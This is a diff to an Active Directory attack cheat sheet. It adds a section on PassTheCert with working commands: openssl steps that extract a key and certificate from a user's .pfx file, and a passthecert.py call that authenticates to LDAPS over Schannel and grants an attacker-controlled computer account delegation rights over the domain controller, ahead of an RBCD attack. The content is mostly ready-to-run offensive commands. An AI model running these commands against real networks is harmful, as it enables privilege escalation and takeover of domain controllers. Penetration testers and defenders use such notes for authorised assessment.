@@ -18,7 +18,7 @@
 
 ### These 3 techniques can be performed for a Pass-the-Ticket attack
 
-# Schannel
+# Schannel (Secure Channel)
 
 #### 1) certipy
 
@@ -27,5 +27,15 @@
  - add_computer
 
  - set_rbcd
+
+#### 2) PassTheCert.py https://github.com/AlmondOffSec/PassTheCert.git
+
+### Extract the .key and .crt files from the .pfx file
+
+ - openssl pkcs12 -in USER_CERT.pfx -nocerts -out USER.key (Extract the .key file. Leave import password blank and put something like 1234 for PEM pass.)
+
+ - openssl pkcs12 -in USER_CERT.pfx -clcerts -nokeys -out USER.crt (Extract the .crt file)
+
+ - python3 passthecert.py -dc-ip DC_IP -crt USER.crt -key USER.key -domain DOMAIN.LOCAL -port 636 -action write_rbcd -delegate-to 'DOMAIN$' -delegate-from 'OUR_COMP$' (Authenticate against LDAPS using Schannel. In this example, we give the computer account we control RBCD, AKA delegation rights over the DC. Enter the PEM phrase we used when extracting the .key file earlier)
 
 ### With this technique, we can now perform an RBCD attack
